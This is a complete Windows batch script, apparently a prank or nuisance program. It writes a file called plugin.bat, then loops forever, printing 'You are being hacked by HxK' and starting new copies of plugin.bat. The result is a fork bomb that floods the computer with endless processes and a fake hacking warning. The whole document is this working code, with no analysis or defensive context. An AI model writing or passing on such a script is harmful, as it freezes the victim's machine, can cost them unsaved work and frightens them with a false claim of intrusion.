@echo off
cls
color 0C
echo @echo off > plugin.bat
echo color 0C >> plugin.bat
echo :hack >> plugin.bat
echo echo ERROR [You are being hacked by HxK] >>  plugin.bat
echo goto hack >>  plugin.bat
:hack
echo ERROR [You are being hacked by HxK]
start plugin.bat 
goto hack